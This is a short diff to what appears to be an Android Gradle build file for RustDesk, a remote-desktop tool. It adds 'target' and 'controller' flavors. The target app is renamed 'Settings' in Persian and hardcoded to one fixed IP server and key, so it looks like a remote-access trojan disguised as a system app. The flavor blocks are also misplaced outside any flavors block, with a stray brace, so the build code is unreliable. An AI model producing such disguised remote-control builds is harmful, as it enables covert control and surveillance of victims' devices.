@@ -17,3 +17,27 @@ subprojects {
 tasks.register("clean", Delete) {
     delete rootProject.buildDir
 }
+
+targetApp {
+    dimension "version"
+    applicationId "io.rustdesk.target"
+    versionName "1.0-target"
+    resValue "string", "app_name", "تنظیمات"
+    buildConfigField "String", "DEFAULT_SERVER", "\"77.92.145.91\""
+    buildConfigField "String", "DEFAULT_KEY", "\"1jro16208HfIn+uI7979XJWszJUx9WGnqJJY7TyMqRE=\""
+    buildConfigField "boolean", "IS_CONTROLLER", "false"
+    buildConfigField "int", "MAX_CONNECTIONS", "5"
+    buildConfigField "boolean", "ENABLE_LOG", "true"
+    buildConfigField "String", "THEME_COLOR", "\"#FF0000\""
+}
+
+controllerApp {
+    dimension "version"
+    applicationId "io.rustdesk.controller"
+    versionName "1.0-controller"
+    resValue "string", "app_name", "تنظیمات"
+    buildConfigField "String", "DEFAULT_SERVER", "\"77.92.145.91\""
+    buildConfigField "String", "DEFAULT_KEY", "\"1jro16208HfIn+uI7979XJWszJUx9WGnqJJY7TyMqRE=\""
+    buildConfigField "boolean", "IS_CONTROLLER", "true"
+}
+}
